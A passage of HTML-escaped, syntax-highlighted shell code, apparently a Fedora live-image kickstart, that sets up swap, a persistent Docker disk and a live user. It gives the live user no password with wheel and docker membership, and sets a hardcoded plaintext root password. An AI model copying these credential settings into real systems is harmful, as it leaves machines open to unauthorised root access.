class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 644 /etc/systemd/system/rc.local.service.d/local.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/rc.d/rc.local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable rc-local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl start rc-local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# FIXME: it\u0026#39;d be better to get this installed from a package\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# live: Init script for live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# chkconfig: 345 00 99\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# description: Init script for live image.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### BEGIN INIT INFO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# X-Start-Before: display-manager\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### END INIT INFO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e. /etc/init.d/functions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; !\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;start\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    exit 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -e /.liveimg-configured ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003econfigdone\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eexists() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ewhich \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\\$*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Make sure we don\u0026#39;t mangle the hardware clock on shutdown\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eln -sf /dev/null /etc/systemd/system/hwclock-save.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elivedir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;LiveOS\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efor arg in \\`cat /proc/cmdline\\` ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${arg##rd.live.dir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    livedir=\\${arg##rd.live.dir=}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    return\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  if [ \u0026#34;\\${arg##live_dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    livedir=\\${arg##live_dir=}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    return\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# enable swaps unless requested otherwise\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eswaps\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\\`blkid -t TYPE=swap -o device\\`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -n \u0026#34;\\$swaps\u0026#34; ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003efor s in \\$swaps ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eaction \u0026#34;Enabling swap partition \\$s\u0026#34; swapon \\$s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -f /run/initramfs/live/\\${livedir}/swap.img ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eaction \u0026#34;Enabling swap file\u0026#34; swapon /run/initramfs/live/\\${livedir}/swap.img\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emountDockerDisk() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# support label/uuid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${dockerdev##LABEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; -o \u0026#34;\\${dockerdev##UUID=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    dockerdev=\\`/sbin/blkid -o device -t \u0026#34;\\$dockerdev\u0026#34;\\`\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# if we\u0026#39;re given a file rather than a blockdev, loopback it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${dockerdev##mtd}\u0026#34; !\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\\${dockerdev}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    # mtd devs don\u0026#39;t have a block device but get magic-mounted with -t jffs2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    mountopts=\u0026#34;-t jffs2\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  elif [ ! -b \u0026#34;\\$dockerdev\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    loopdev=\\`losetup -f\\`\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    if [ \u0026#34;\\${dockerdev##/run/initramfs/live}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      action \u0026#34;Remounting live store r/w\u0026#34; mount -o remount,rw /run/initramfs/live\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    losetup \\$loopdev \\$dockerdev\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    dockerdev=\\$loopdev\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# if it\u0026#39;s encrypted, we need to unlock it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\$(/sbin/blkid -s TYPE -o value \\$dockerdev 2\u0026gt;/dev/null)\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;crypto_LUKS\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    echo\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    echo \u0026#34;Setting up encrypted Docker device\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    plymouth ask-for-password --command=\u0026#34;cryptsetup luksOpen \\$dockerdev EncDocker\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    dockerdev=/dev/mapper/EncDocker\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# and finally do the mount\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003emount \\$mountopts \\$dockerdev /var/lib/docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# if we have /home under what\u0026#39;s passed for persistent home, then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# we should make that the real /home.  useful for mtd device on olpc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ -d /var/lib/docker/docker ]; then mount --bind /var/lib/docker/docker /var/lib/docker ; fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e[ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/lib/docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efindDockerDisk() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003efor arg in \\`cat /proc/cmdline\\` ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${arg##dockerdisk\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      dockerdev=\\${arg##dockerdisk=}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      return\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  done\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; dockerdisk\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  findDockerDisk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eelif [ -e /run/initramfs/live/\\${livedir}/docker.img ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003edockerdev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e/run/initramfs/live/\\${livedir}/docker.img\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if we have a persistent /home, then we want to go ahead and mount it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; nodockerdisk \u0026amp;\u0026amp; [ -n \u0026#34;\\$dockerdev\u0026#34; ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eaction \u0026#34;Mounting persistent /var/lib/docker\u0026#34; mountDockerDisk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make it so that we don\u0026#39;t do writing to the overlay for things which\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# are just tmpdirs/caches\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emount -t tmpfs -o mode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e0755 varcacheyum /var/cache/yum\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emount -t tmpfs vartmp /var/tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e[ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/cache/yum /var/tmp \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -n \u0026#34;\\$configdone\u0026#34; ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eexit 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# add fedora user with no passwd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eaction \u0026#34;Adding live user\u0026#34; useradd \\$USERADDARGS -c \u0026#34;Live System User\u0026#34; liveuser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epasswd -d liveuser \u0026gt; /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eusermod -aG wheel,docker liveuser \u0026gt; /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Remove root password lock\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epasswd -d root \u0026gt; /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e(echo Kalaisadog2021; echo Kalaisadog2021)|passwd root --stdin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# turn off firstboot for livecd boots\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable firstboot-text.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable firstboot-graphical.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop firstboot-text.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop firstboot-graphical.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# don\u0026#39;t use prelink on a running live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esed -i \u0026#39;s/PRELINKING\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eyes/PRELINKING=no/\u0026#39; /etc/sysconfig/prelink \u0026amp;\u0026gt;/dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# turn off mdmonitor by 